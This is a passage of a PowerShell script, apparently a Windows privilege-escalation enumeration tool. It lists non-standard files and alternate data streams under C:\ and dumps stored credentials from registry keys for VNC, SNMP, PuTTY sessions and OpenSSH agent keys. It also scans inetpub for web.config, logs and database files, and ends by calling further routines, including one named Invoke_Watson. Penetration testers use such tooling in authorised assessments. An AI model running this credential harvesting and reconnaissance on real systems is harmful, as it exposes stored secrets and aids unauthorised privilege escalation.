                                $adsContent | Select-Object -First 5 | ForEach-Object {
                                    Write-Host "                $_"
                                }
                            } else {
                                Write-Host "            [!] ADS is empty or unreadable"
                            }
                        } catch {
                            Write-Host "            [!] Could not read ADS content: $_" -ForegroundColor DarkYellow
                        }
                    }
                }
            }
        }
    }
    Write-Host "[+] Looking in C:\..." -ForegroundColor Yellow
    $standardDirs = @('$WinREAgent', 'ESD', 'System Volume Information', 'Config.Msi', '$Windows.~WS', '$WINDOWS.~BT', 'Program Files', 'Program Files (x86)', 'Users', 'Windows', '$Recycle.Bin', 'PerfLogs', 'ProgramData')

    Get-ChildItem -Path "C:\" -Force -ErrorAction SilentlyContinue | ForEach-Object {
        if ($standardDirs -notcontains $_.Name) {
            if (Test-Path -Path $_.FullName){
                if ($_.PSIsContainer) {
                    Write-Host "    [*] Non-standard directory found: $($_.FullName)" -ForegroundColor Red
                } else {
                    Write-Host "    [*] Non-standard file found: $($_.FullName)" -ForegroundColor Red
                    try{
                        $ads = Get-Item -Path $_.FullName -Stream * -ErrorAction SilentlyContinue | Where-Object { $_.Stream -ne ':$DATA' -and $_.Stream -ne 'Zone.Identifier' }
                        if ($ads) {
                            foreach ($stream in $ads) {
                                Write-Host "        [!] ADS found: $($stream.FileName):$($stream.Stream)" -ForegroundColor Red
                            }
                        }
                    }catch{}
                }
            }
        }
    }
    Write-Host "    [+] Files in registry that may contain credentials" -ForegroundColor Yellow

    $registryChecks = @(
        'HKCU:\Software\ORL\WinVNC3\Password',
        'HKLM:\SOFTWARE\RealVNC\WinVNC4',
        'HKLM:\SYSTEM\CurrentControlSet\Services\SNMP',
        'HKCU:\Software\TightVNC\Server',
        'HKCU:\Software\SimonTatham\PuTTY\Sessions',
        'HKCU:\Software\OpenSSH\Agent\Keys'
    )
    foreach ($reg in $registryChecks) {
        
        try {
            $item = Get-ItemProperty -Path $reg -ErrorAction Stop
            if ($item) {
                Write-Host "    [+] Looking inside $reg" -ForegroundColor Red
                foreach ($prop in $item.PSObject.Properties) {
                    Write-Host ("       {0}: {1}" -f $prop.Name, $prop.Value)
                }
            }    
        } catch {}
    }
    # Scan inetpub for web.config and logs
    if (Test-Path "C:\inetpub") {
        Write-Host "    [+] Scanning inetpub..." -ForegroundColor Yellow
        Get-ChildItem -Path "C:\inetpub" -Recurse -Include "web.config", "*.log", "*.php","*.db" -ErrorAction SilentlyContinue |
            Select-Object FullName
    }
}


Check_Path
Check_Services
Check_Installed
Check_Processes
Check_Passwords
Check_Scheduled
Check_Startup
Check_Me
Check_Files
Get_NetworkPortInfo
Invoke_Watson